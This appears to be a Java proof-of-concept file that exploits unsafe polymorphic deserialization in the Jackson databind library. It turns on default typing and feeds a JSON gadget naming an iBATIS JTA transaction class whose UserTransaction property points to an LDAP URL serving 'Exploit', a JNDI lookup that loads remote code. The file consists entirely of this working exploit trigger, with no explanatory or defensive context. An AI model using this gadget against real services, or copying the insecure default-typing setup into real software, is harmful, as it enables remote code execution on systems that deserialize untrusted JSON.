import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

public class Poc {
    public static void main(String args[]) {
        ObjectMapper mapper = new ObjectMapper();

        mapper.enableDefaultTyping();

        String json = "[\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\", {\"properties\": {\"UserTransaction\":\"ldap://localhost:1389/Exploit\"}}]";
        try {
            mapper.readValue(json, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
